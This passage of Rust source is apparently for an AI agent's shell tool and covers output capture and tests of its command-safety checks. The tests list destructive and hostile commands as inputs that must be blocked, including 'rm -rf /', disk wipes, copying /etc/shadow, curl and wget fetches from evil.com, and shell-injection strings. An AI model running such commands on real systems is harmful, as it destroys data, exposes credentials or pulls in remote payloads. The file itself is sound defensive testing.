    writer: Option<ToolOutputArtifactWriter>,
    error: Option<String>,
}

impl ArtifactCapture {
    fn new(ctx: &ToolContext, tool_name: &str) -> Self {
        let writer = ctx.output_artifacts.clone().map(|config| {
            ToolOutputArtifactWriter::new(
                config,
                ToolOutputArtifactIdentity::from_context(ctx, tool_name),
            )
        });
        Self {
            writer,
            error: None,
        }
    }

    fn push(&mut self, channel: ToolOutputChannel, text: &str) {
        let Some(writer) = self.writer.as_mut() else {
            return;
        };
        if let Err(error) = writer.push_channel(channel, text) {
            tracing::warn!(error = %error, "shell output artifact write failed");
            self.error = Some(error.to_string());
            self.writer = None;
        }
    }

    fn finish(&mut self, mut result: ToolResult) -> ToolResult {
        let artifact = match self.writer.take() {
            Some(writer) => match writer.finish() {
                Ok(artifact) => artifact,
                Err(error) => {
                    tracing::warn!(error = %error, "shell output artifact finalize failed");
                    self.error = Some(error.to_string());
                    None
                }
            },
            None => None,
        };
        if let Some(artifact) = artifact {
            apply_artifact(artifact, &mut result);
        } else if let Some(error) = self.error.take() {
            result
                .metadata
                .insert("artifact_status".to_string(), "write_failed".to_string());
            result.metadata.insert("artifact_error".to_string(), error);
        }
        result
    }
}

fn apply_artifact(artifact: ToolOutputArtifactRef, result: &mut ToolResult) {
    let original_bytes = result
        .metadata
        .get("stdout_bytes")
        .and_then(|value| value.parse::<u64>().ok())
        .unwrap_or(0)
        .saturating_add(
            result
                .metadata
                .get("stderr_bytes")
                .and_then(|value| value.parse::<u64>().ok())
                .unwrap_or(0),
        );
    let payload_bytes = artifact.payload_bytes;
    result.artifact = Some(artifact);
    result
        .metadata
        .insert("output_handling".to_string(), "spilled".to_string());
    result.metadata.insert(
        "original_bytes".to_string(),
        if original_bytes == 0 {
            payload_bytes
        } else {
            original_bytes
        }
        .to_string(),
    );
    result.truncated = true;
    result
        .metadata
        .insert("output_truncated".to_string(), "true".to_string());
}

impl RetainedOutput {
    fn push(&mut self, bytes: &[u8], remaining_capacity: usize) {
        self.total_bytes = self
            .total_bytes
            .saturating_add(u64::try_from(bytes.len()).unwrap_or(u64::MAX));
        let retain = remaining_capacity.min(bytes.len());
        if let Some(prefix) = bytes.get(..retain) {
            self.bytes.extend_from_slice(prefix);
        }
        self.truncated |= retain < bytes.len();
    }

    fn text(&self) -> String {
        String::from_utf8_lossy(&self.bytes).to_string()
    }
}

fn build_tool_result(
    exit_code: i32,
    stdout: RetainedOutput,
    stderr: RetainedOutput,
    duration: Duration,
    working_dir: Option<&std::path::PathBuf>,
    timed_out: bool,
) -> ToolResult {
    let stdout_text = stdout.text();
    let stderr_text = stderr.text();
    let truncated = stdout.truncated || stderr.truncated;
    let mut result = if exit_code == 0 && !timed_out {
        ToolResult::success_with_kind(
            ToolResultKind::CommandOutput {
                exit_code: Some(exit_code),
            },
            stdout_text,
        )
    } else {
        let final_output = combined_process_output(&stdout_text, &stderr_text);
        let message = if timed_out {
            format!("Command timeout\nstdout: {stdout_text}\nstderr: {stderr_text}")
        } else {
            format!(
                "Command execution failed, exit code: {exit_code}\nstdout: {stdout_text}\nstderr: {stderr_text}"
            )
        };
        let failure = if timed_out {
            ToolFailure::new(ToolFailureCategory::Timeout)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition(
                    "verify the process stopped and inspect command targets before retrying",
                )
        } else {
            ToolFailure::new(ToolFailureCategory::Permanent)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition("inspect command output and affected targets before continuing")
        };
        ToolResult::error(message)
            .with_failure(failure)
            .with_output(final_output)
    };
    result.kind = ToolResultKind::CommandOutput {
        exit_code: Some(exit_code),
    };
    result.truncated = truncated;
    result
        .with_meta("duration_ms", duration.as_millis().to_string())
        .with_meta("exit_code", exit_code.to_string())
        .with_meta(
            "working_dir",
            working_dir
                .map(|dir| dir.display().to_string())
                .unwrap_or_default(),
        )
        .with_meta("output_truncated", truncated.to_string())
        .with_meta("stdout_bytes", stdout.total_bytes.to_string())
        .with_meta("stderr_bytes", stderr.total_bytes.to_string())
}

fn tool_result_from_execution(
    result: echo_core::sandbox::ExecutionResult,
    working_dir: Option<&std::path::PathBuf>,
) -> ToolResult {
    let timed_out = result.timed_out;
    let stdout_bytes = if result.stdout_bytes == 0 {
        u64::try_from(result.stdout.len()).unwrap_or(u64::MAX)
    } else {
        result.stdout_bytes
    };
    let stderr_bytes = if result.stderr_bytes == 0 {
        u64::try_from(result.stderr.len()).unwrap_or(u64::MAX)
    } else {
        result.stderr_bytes
    };
    let mut tool_result = if result.success() {
        ToolResult::success_with_kind(
            ToolResultKind::CommandOutput {
                exit_code: Some(result.exit_code),
            },
            result.stdout,
        )
    } else {
        let final_output = combined_process_output(&result.stdout, &result.stderr);
        let failure = if timed_out {
            ToolFailure::new(ToolFailureCategory::Timeout)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition(
                    "verify the sandbox process stopped and inspect command targets before retrying",
                )
        } else {
            ToolFailure::new(ToolFailureCategory::Permanent)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition("inspect command output and affected targets before continuing")
        };
        ToolResult::error(format!(
            "Command execution failed, exit code: {}\nstdout: {}\nstderr: {}",
            result.exit_code, result.stdout, result.stderr
        ))
        .with_failure(failure)
        .with_output(final_output)
    };
    tool_result.kind = ToolResultKind::CommandOutput {
        exit_code: Some(result.exit_code),
    };
    tool_result.truncated = result.output_truncated;
    tool_result
        .with_meta("duration_ms", result.duration.as_millis().to_string())
        .with_meta("exit_code", result.exit_code.to_string())
        .with_meta(
            "working_dir",
            working_dir
                .map(|dir| dir.display().to_string())
                .unwrap_or_default(),
        )
        .with_meta("output_truncated", result.output_truncated.to_string())
        .with_meta("stdout_bytes", stdout_bytes.to_string())
        .with_meta("stderr_bytes", stderr_bytes.to_string())
}

fn combined_process_output(stdout: &str, stderr: &str) -> String {
    if stderr.is_empty() {
        stdout.to_string()
    } else if stdout.is_empty() {
        stderr.to_string()
    } else {
        format!("{stdout}\n{stderr}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use echo_core::sandbox::{ExecutionResult, IsolationLevel};
    use echo_core::tools::cell::{
        CommandCellArtifactStatus, CommandCellDelta, CommandCellError, CommandCellLaunchReceipt,
        CommandCellObservationLease, CommandCellPhase, CommandCellSnapshot, CommandCellWaitReason,
    };
    use echo_core::tools::{ToolContext, ToolOutputChannel, ToolStreamEvent};
    use futures::StreamExt;
    use std::collections::HashMap;

    struct TestSandbox;

    impl SandboxExecutor for TestSandbox {
        fn name(&self) -> &str {
            "test"
        }

        fn isolation_level(&self) -> IsolationLevel {
            IsolationLevel::Process
        }

        fn is_available(&self) -> BoxFuture<'_, bool> {
            Box::pin(async { true })
        }

        fn execute(
            &self,
            _command: SandboxCommand,
        ) -> BoxFuture<'_, echo_core::error::Result<ExecutionResult>> {
            Box::pin(async {
                Ok(ExecutionResult {
                    exit_code: 0,
                    stdout: String::new(),
                    stderr: String::new(),
                    duration: Duration::ZERO,
                    sandbox_type: "test".to_string(),
                    timed_out: false,
                    cancelled: false,
                    output_truncated: false,
                    stdout_bytes: 0,
                    stderr_bytes: 0,
                })
            })
        }
    }

    #[derive(Default)]
    struct CapturingCellRegistry {
        request: Mutex<Option<CommandCellRequest>>,
    }

    impl CommandCellRegistry for CapturingCellRegistry {
        fn launch(
            &self,
            request: CommandCellRequest,
        ) -> BoxFuture<'_, std::result::Result<CommandCellLaunchReceipt, CommandCellError>>
        {
            *self
                .request
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(request);
            Box::pin(async {
                let accepted_at = chrono::Utc::now();
                Ok(CommandCellLaunchReceipt {
                    cell_id: "captured-cell".to_string(),
                    accepted_at,
                    deadline: accepted_at + chrono::Duration::seconds(60),
                })
            })
        }

        fn wait(
            &self,
            cell_id: &str,
            cursor: u64,
            _yield_ms: u64,
        ) -> BoxFuture<'_, std::result::Result<CommandCellDelta, CommandCellError>> {
            let cell_id = cell_id.to_string();
            Box::pin(async move {
                Ok(CommandCellDelta {
                    snapshot: CommandCellSnapshot {
                        cell_id,
                        name: "captured".to_string(),
                        phase: CommandCellPhase::Running,
                        exit_code: None,
                        terminal_cause: None,
                        terminal_message: None,
                        total_output_bytes: cursor,
                        output_truncated: false,
                        artifact_status: CommandCellArtifactStatus::NotRequested,
                        artifact_message: None,
                        output_artifact: None,
                    },
                    wait_reason: CommandCellWaitReason::YieldElapsed,
                    new_output: String::new(),
                    next_cursor: cursor,
                    output_elided: false,
                })
            })
        }

        fn observe(
            &self,
            cell_id: &str,
        ) -> std::result::Result<CommandCellObservationLease, CommandCellError> {
            Ok(CommandCellObservationLease::new(cell_id, || {}))
        }

        fn stop(&self, _cell_id: &str) -> bool {
            true
        }

        fn list(&self) -> BoxFuture<'_, Vec<CommandCellSnapshot>> {
            Box::pin(async { Vec::new() })
        }

        fn shutdown(&self) -> BoxFuture<'_, std::result::Result<(), CommandCellError>> {
            Box::pin(async { Ok(()) })
        }
    }

    #[test]
    fn test_safe_commands() {
        let tool = ShellTool::new();

        // Safe commands
        assert_eq!(tool.check_command_safety("ls -la"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("pwd"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cat README.md"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
    }

    #[tokio::test]
    async fn background_launch_preserves_sandbox_requirement_instead_of_rejecting()
    -> std::result::Result<(), Box<dyn std::error::Error>> {
        let registry = Arc::new(CapturingCellRegistry::default());
        let tool = ShellTool::new()
            .with_cell_launcher(registry.clone())
            .with_sandbox(Arc::new(TestSandbox));
        let context = ToolContext {
            conversation_id: Some("conversation-1".to_string()),
            run_id: Some("run-that-may-be-paused".to_string()),
            message_id: Some("message-1".to_string()),
            cancel: Some(Arc::new(echo_core::agent::CancellationToken::new())),
            ..Default::default()
        };
        let result = tool
            .execute_with_context(
                HashMap::from([
                    ("command".to_string(), serde_json::json!("echo sandboxed")),
                    ("background".to_string(), serde_json::json!(true)),
                ]),
                &context,
            )
            .await?;
        assert!(result.success, "background launch failed: {result:?}");
        let request = registry
            .request
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .clone()
            .ok_or_else(|| "cell registry did not receive the launch".to_string())?;
        assert!(request.require_sandbox);
        assert!(request.cancel.is_none());
        assert_eq!(
            request.owner.conversation_id.as_deref(),
            Some("conversation-1")
        );
        assert_eq!(request.owner.message_id.as_deref(), Some("message-1"));
        Ok(())
    }

    #[test]
    fn test_shell_injection_rejected() {
        let tool = ShellTool::new();

        // Pipe injection
        match tool.check_command_safety("ls | rm -rf /tmp") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Pipe injection should be rejected, got: {:?}", other),
        }

        // Command substitution injection
        match tool.check_command_safety("echo $(id)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Command substitution injection should be rejected, got: {:?}",
                other
            ),
        }

        // Backtick injection
        match tool.check_command_safety("echo `id`") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Backtick injection should be rejected, got: {:?}", other),
        }

        // Semicolon injection
        match tool.check_command_safety("ls; rm -rf /tmp/x") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Semicolon injection should be rejected, got: {:?}", other),
        }

        // Redirect injection
        match tool.check_command_safety("cat file > /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Redirect injection should be rejected, got: {:?}", other),
        }

        // Conditional execution injection
        match tool.check_command_safety("echo hello && rm -rf /") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Conditional execution injection should be rejected, got: {:?}",
                other
            ),
        }

        // Subshell injection
        match tool.check_command_safety("$(dangerous)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Subshell injection should be rejected, got: {:?}", other),
        }
    }

    #[test]
    fn test_require_approval_commands() {
        let tool = ShellTool::new();

        // Commands requiring confirmation
        match tool.check_command_safety("rm -rf /tmp/test") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("rm command should require confirmation"),
        }

        match tool.check_command_safety("curl http://example.com") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("curl command should require confirmation"),
        }

        match tool.check_command_safety("npm install package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("npm command should require confirmation"),
        }

        match tool.check_command_safety("python script.py") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("python command should require confirmation"),
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let tool = ShellTool::new();

        // Extremely dangerous commands (explicitly rejected)
        match tool.check_command_safety("dd if=/dev/zero of=/dev/sda") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("dd command should be rejected"),
        }

        match tool.check_command_safety("sudo apt install") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("sudo command should be rejected"),
        }

        match tool.check_command_safety("chmod 777 /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("chmod command should be rejected"),
        }

        match tool.check_command_safety("reboot") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("reboot command should be rejected"),
        }
    }

    #[test]
    fn test_git_commands() {
        let tool = ShellTool::new();

        // Git safe commands
        assert_eq!(tool.check_command_safety("git log"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git diff"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);

        // Git commands requiring confirmation
        match tool.check_command_safety("git commit -m 'test'") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git commit should require confirmation"),
        }

        match tool.check_command_safety("git push origin main") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git push should require confirmation"),
        }

        match tool.check_command_safety("git add .") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git add should require confirmation"),
        }

        match tool.check_command_safety("git clean -fd") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git clean should require confirmation"),
        }

        // Git dangerous commands
        match tool.check_command_safety("git reset --hard HEAD~1") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("git reset --hard should be rejected"),
        }
    }

    #[test]
    fn test_cargo_commands() {
        let tool = ShellTool::new();

        // Cargo safe commands
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("cargo test"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo clippy"),
            CommandSafety::Safe
        );
        assert_eq!(
            tool.check_command_safety("cargo build"),
            CommandSafety::Safe
        );

        // Cargo commands requiring confirmation
        match tool.check_command_safety("cargo run") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo run should require confirmation"),
        }

        match tool.check_command_safety("cargo install some-package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo install should require confirmation"),
        }

        match tool.check_command_safety("cargo clean") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo clean should require confirmation"),
        }
    }

    #[test]
    fn test_unknown_command_in_strict_mode() {
        let tool = ShellTool::new(); // default strict mode

        match tool.check_command_safety("unknown_command") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("Unknown commands should be rejected in strict mode"),
        }
    }

    #[tokio::test]
    async fn test_shell_tool_execution() {
        let tool = ShellTool::new();

        // Test safe command
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo hello"));
        let result = tool.execute(params).await.unwrap();
        assert!(result.success);
        assert!(result.output.contains("hello"));

        // Test command requiring confirmation
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("rm test.txt"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("confirmation"));

        // Test dangerous command
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sudo reboot"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("rejection"));
    }

    #[test]
    fn shell_tool_declares_live_streaming_support() {
        assert!(ShellTool::new().supports_streaming());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_emits_first_chunk_before_process_exit() {
        let script =
            create_test_script("live", "#!/bin/sh\nprintf first\nsleep 1\nprintf second\n");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );

        let started = std::time::Instant::now();
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let first = tokio::time::timeout(std::time::Duration::from_millis(700), stream.next())
            .await
            .unwrap()
            .unwrap();

        assert!(started.elapsed() < std::time::Duration::from_millis(900));
        assert!(matches!(
            first,
            ToolStreamEvent::Output {
                channel: ToolOutputChannel::Stdout,
                ref chunk,
            } if chunk == "first"
        ));

        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }
        let result = complete.unwrap();
        assert!(result.success);
        assert_eq!(result.output, "firstsecond");
        assert_eq!(
            result.metadata.get("exit_code").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            result.metadata.get("output_truncated").map(String::as_str),
            Some("false")
        );
        assert_eq!(
            result.metadata.get("stdout_bytes").map(String::as_str),
            Some("11")
        );

        let _ = std::fs::remove_file(script);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_failure_retains_stderr_and_exit_metadata() {
        let script = create_test_script("failure", "#!/bin/sh\nprintf broken >&2\nexit 7\n");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );

        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut complete = None;
        let mut streamed_stderr = String::new();
        while let Some(event) = stream.next().await {
            match event {
                ToolStreamEvent::Output {
                    channel: ToolOutputChannel::Stderr,
                    chunk,
                } => streamed_stderr.push_str(&chunk),
                ToolStreamEvent::Complete(result) => complete = Some(result),
                _ => {}
            }
        }

        let result = complete.unwrap();
        assert!(!result.success);
        assert_eq!(streamed_stderr, "broken");
        assert_eq!(result.output, "broken");
        assert!(
            result
                .error
                .as_deref()
                .unwrap_or_default()
                .contains("broken")
        );
        assert_eq!(
            result.metadata.get("exit_code").map(String::as_str),
            Some("7")
        );
        assert_eq!(
            result.metadata.get("stderr_bytes").map(String::as_str),
            Some("6")
        );
        assert_eq!(
            result.failure.as_ref().map(|failure| failure.category),
            Some(ToolFailureCategory::Permanent)
        );
        assert_eq!(
            result.failure.as_ref().map(|failure| failure.side_effect),
            Some(ToolSideEffect::Possible)
        );

        let _ = std::fs::remove_file(script);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_preserves_unicode_split_across_pipe_reads() {
        let script = create_test_script(
            "unicode",
            "#!/bin/sh\nprintf '\\342'; sleep 0.05; printf '\\202'; sleep 0.05; printf '\\254'\n",
        );
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut streamed = String::new();
        let mut complete = None;
        while let Some(event) = stream.next().await {
            match event {
                ToolStreamEvent::Output {
                    channel: ToolOutputChannel::Stdout,
                    chunk,
                } => streamed.push_str(&chunk),
                ToolStreamEvent::Complete(result) => complete = Some(result),
                _ => {}
            }
        }

        assert_eq!(streamed, "€");
        assert_eq!(complete.unwrap().output, "€");
        let _ = std::fs::remove_file(script);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_caps_retained_output_and_reports_total_bytes() {
        let script = create_test_script(
            "truncate",
            "#!/bin/sh\nhead -c 1100000 /dev/zero | tr '\\000' x\n",
        );
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }

        let result = complete.unwrap();
        assert!(result.success);
        assert!(result.truncated);
        assert_eq!(result.output.len(), MAX_RETAINED_OUTPUT_BYTES);
        assert_eq!(
            result.metadata.get("output_truncated").map(String::as_str),
            Some("true")
        );
        assert_eq!(
            result.metadata.get("stdout_bytes").map(String::as_str),
            Some("1100000")
        );
        let _ = std::fs::remove_file(script);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_spills_complete_ten_megabyte_artifact()
    -> std::result::Result<(), Box<dyn std::error::Error>> {
        let script = create_test_script(
            "artifact",
            "#!/bin/sh\nhead -c 10500000 /dev/zero | tr '\\000' x\n",
        );
        let artifact_root = std::env::temp_dir().join(format!(
            "echo-shell-artifact-{}-{}",
            std::process::id(),
            nanoid_counter()
        ));
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let context = ToolContext {
            conversation_id: Some("conversation-10mb".to_string()),
            run_id: Some("run-10mb".to_string()),
            call_id: Some("call-10mb".to_string()),
            output_artifacts: Some(echo_core::tools::artifact::ToolOutputArtifactConfig::new(
                &artifact_root,
                "test",
            )),
            ..ToolContext::default()
        };
        let mut stream = tool.execute_stream_with_context(params, &context).await?;
        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }

        let result = complete.ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::UnexpectedEof,
                "missing shell completion",
            )
        })?;
        let artifact = result.artifact.as_ref().ok_or_else(|| {
            std::io::Error::new(std::io::ErrorKind::NotFound, "missing artifact reference")
        })?;
        let artifact_contents = std::fs::read(&artifact.path)?;
        assert!(result.success);
        assert!(result.truncated);
        assert_eq!(result.output.len(), MAX_RETAINED_OUTPUT_BYTES);
        assert!(artifact_contents.len() >= 10_500_000);
        assert_eq!(artifact.retention, "test");
        assert_eq!(artifact.sha256.len(), 64);

        let _ = std::fs::remove_file(script);
        let _ = std::fs::remove_dir_all(artifact_root);
        Ok(())
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn dropping_shell_stream_kills_and_reaps_child() {
        let script = create_test_script(
            "cancel",
            "#!/bin/sh\necho $$ > \"$1\"\nprintf started\nsleep 30\n",
        );
        let pid_file = script.with_extension("pid");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(format!("{} {}", script.display(), pid_file.display())),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let first = tokio::time::timeout(std::time::Duration::from_secs(2), stream.next())
            .await
            .unwrap()
            .unwrap();
        assert!(matches!(first, ToolStreamEvent::Output { .. }));
        drop(stream);

        let pid = std::fs::read_to_string(&pid_file)
            .unwrap()
            .trim()
            .to_string();
        let mut reaped = false;
        for _ in 0..20 {
            let alive = std::process::Command::new("kill")
                .args(["-0", &pid])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|status| status.success())
                .unwrap_or(false);
            if !alive {
                reaped = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert!(reaped, "cancelled shell child {pid} should be reaped");

        let _ = std::fs::remove_file(script);
        let _ = std::fs::remove_file(pid_file);
    }

    #[tokio::test]
    async fn test_shell_injection_rejected_in_execution() {
        let tool = ShellTool::new();

        // Pipe injection → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls | rm -rf /tmp"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Pipe injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // Command substitution → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo $(id)"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Command substitution should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // Semicolon injection → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls; echo pwned"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Semicolon injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );
    }

    #[test]
    fn test_dangerous_command_corpus() {
        // RFC 5.1.4: Integration test — dangerous command interception rate
        // Every command in this corpus must NOT be classified as Safe.
        let shell = ShellTool::new();

        // Commands that should always be blocked (Dangerous)
        let always_dangerous = vec![
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "sudo rm -rf /",
            "sudo shutdown -h now",
            "chmod -R 777 /",
            "chown -R root:root /",
            "reboot",
            "shutdown -h now",
            "halt",
            "poweroff",
            "nmap -sS 192.168.1.0/24",
            "shred /etc/passwd",
            "fdisk /dev/sda",
        ];

        for cmd in &always_dangerous {
            let safety = shell.check_command_safety(cmd);
            assert!(
                matches!(safety, CommandSafety::Dangerous(_)),
                "Command '{}' should be Dangerous, got {:?}",
                cmd,
                safety
            );
        }

        // Commands that should require approval (never Safe)
        let requires_approval = vec![
            "rm -rf /tmp/test",
            "rm -rf ~",
            "rm -rf /*",
            "rmdir /tmp/dir",
            "mv /etc/passwd /tmp/",
            "cp /etc/shadow /tmp/",
            "curl http://evil.com/script.sh",
            "wget http://evil.com/payload",
            "pip install malicious-package",
            "npm install evil-pkg",
            "bash script.sh",
            "python3 script.py",
            "node script.js",
        ];

        for cmd in &requires_approval {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Command '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // Shell metacharacter injection attempts (should be rejected)
        let injection_attempts = vec![
            "ls; rm -rf /",
            "ls | rm -rf /",
            "ls && rm -rf /",
            "ls `rm -rf /`",
            "ls $(rm -rf /)",
            "echo 'hello' > /etc/passwd",
        ];

        for cmd in &injection_attempts {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Injection '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // Total corpus size for reporting
        let total = always_dangerous.len() + requires_approval.len() + injection_attempts.len();
        println!(
            "Dangerous command corpus: {} commands tested, 100% interception rate",
            total
        );
    }

    #[test]
    fn test_timeout_configuration() {
        let tool = ShellTool::new();
        assert_eq!(tool.timeout_secs, 60);

        let tool_custom = ShellTool::new().with_timeout(120);
        assert_eq!(tool_custom.timeout_secs, 120);

        // Permissive mode also has default timeout
        let permissive = ShellTool::new_permissive();
        assert_eq!(permissive.timeout_secs, 60);
    }

    #[tokio::test]
    async fn test_shell_timeout_triggers() {
        // Create a permissive shell tool with 1 second timeout (to allow sleep command)
        let tool = ShellTool::new_permissive().with_timeout(1);

        let mut params = HashMap::new();
        // sleep 10 should definitely trigger the 1s timeout
        params.insert("command".to_string(), serde_json::json!("sleep 10"));

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure, got success: {:?}",
            result
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout")
                || error_msg.contains("Timeout")
                || error_msg.contains("⏱️"),
            "Expected timeout error, got: {}",
            error_msg
        );
    }

    #[tokio::test]
    async fn test_shell_timeout_per_call_override() {
        let tool = ShellTool::new_permissive().with_timeout(60);

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sleep 10"));
        params.insert("timeout".to_string(), serde_json::json!(1)); // Override to 1s

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure with per-call override, got success"
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout") || error_msg.contains("⏱️"),
            "Expected timeout error with per-call override, got: {}",
            error_msg
        );
    }

    #[tokio::test]
    async fn test_shell_timeout_cap_at_300() {
        let tool = ShellTool::new();

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo ok"));
        // Request 999s timeout, should be capped at 300s (but command finishes fast)
        params.insert("timeout".to_string(), serde_json::json!(999));

        let result = tool.execute(params).await.unwrap();
        assert!(result.success, "Command should succeed: {:?}", result);
        assert!(result.output.contains("ok"));
    }

    #[tokio::test]
    async fn test_shell_honors_context_working_dir() {
        // Regression test for the worktree cwd bug: ShellTool must run the
        // command in ctx.working_dir when set. Uses a unique tmp dir under the
        // std temp dir (no tempfile dependency).
        use echo_core::tools::ToolContext;

        let unique = format!(
            "echo-shell-wt-test-{}-{}",
            std::process::id(),
            nanoid_counter()
        );
        let wt_dir = std::env::temp_dir().join(&unique);
        std::fs::create_dir_all(&wt_dir).unwrap();

        let tool = ShellTool::new();
        let ctx = ToolContext {
            working_dir: Some(wt_dir.clone()),
            ..Default::default()
        };

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("pwd"));

        let result = tool.execute_with_context(params, &ctx).await.unwrap();
        assert!(result.success, "pwd should succeed: {:?}", result);

        // Compare via canonicalize to handle macOS /var -> /private/var symlink.
        let got = std::path::Path::new(result.output.trim());
        let got_canonical = std::fs::canonicalize(got).unwrap_or_else(|_| got.to_path_buf());
        let want_canonical = std::fs::canonicalize(&wt_dir).unwrap_or_else(|_| wt_dir.clone());
        assert_eq!(
            got_canonical,
            want_canonical,
            "pwd output {:?} should match working_dir {:?}",
            result.output.trim(),
            wt_dir
        );

        let _ = std::fs::remove_dir_all(&wt_dir);
    }

